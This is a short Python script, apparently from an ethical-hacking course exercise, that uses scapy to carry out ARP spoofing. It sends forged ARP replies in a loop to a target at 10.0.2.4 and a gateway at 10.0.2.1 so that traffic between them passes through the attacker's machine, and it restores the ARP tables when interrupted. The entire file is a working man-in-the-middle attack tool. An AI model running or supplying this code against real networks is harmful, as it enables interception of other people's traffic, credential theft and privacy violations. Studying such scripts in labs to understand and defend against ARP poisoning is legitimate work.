import sys
import time

import  scapy.all as scapy


def get_mac(ip):
    # check network_scanner for elaboration
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)
    # print(packet.show())
    # print(packet.summary())


target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"

sent_packets_count = 0
try:
    # python 2
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)


    # python 3
    # while True:
    #     spoof("192.168.1.8", "192.168.1.1")
    #     spoof("192.168.1.1", "192.168.1.8")
    #     sent_packets_count += 2
    #     print("\r[+] Packets sent: " + str(sent_packets_count), end="")
    #     sys.stdout.flush()
    #     time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)